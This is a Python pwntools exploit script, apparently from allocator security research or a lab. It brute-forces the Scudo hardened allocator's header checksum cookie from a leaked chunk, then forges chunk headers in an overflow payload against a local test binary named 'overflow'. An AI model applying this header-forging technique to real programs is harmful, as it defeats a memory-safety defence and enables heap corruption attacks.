#!/usr/bin/python3
import sys
sys.path.append("..")
from pwn import *
from utils import *
from scudocookie import bruteforce, calc_checksum

elf = context.binary = ELF("overflow")

gs = '''
source ../malloc-menu-linux/scudo-69d4e5ae7b97.py
continue
'''

SCUDO_LIB = os.path.realpath("../malloc-menu-linux/libscudo-linux.so") 
env = {"LD_PRELOAD": SCUDO_LIB}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)
    
io = start()


# =============================================================================

addr1, header1, checksum1 = getLeak(io)

io.recvuntil(b": ")
addr2 = int(io.recvline(keepends=False), base=16)
info(f"Exploitable: {'True' if addr2 > addr1 else 'False'}")

cookie = bruteforce(addr1, checksum1, header1 & ((1 << 0x30)-1))

info(f"Cookie: {hex(cookie)}")

new_header = create_header(6, 8, 1)

chunk_data = b""

for i in range(1,256):
    chunk_data += b"a"*16 + forge_header(addr1 + 0x20*i, cookie, new_header) + b"\0"*8

io.send(chunk_data)
io.send(b"\n")

io.recvuntil(b": ")
info(f"New Chunk: {hex(int(io.recvline(keepends=False), base=16))}")

# =============================================================================

io.interactive()
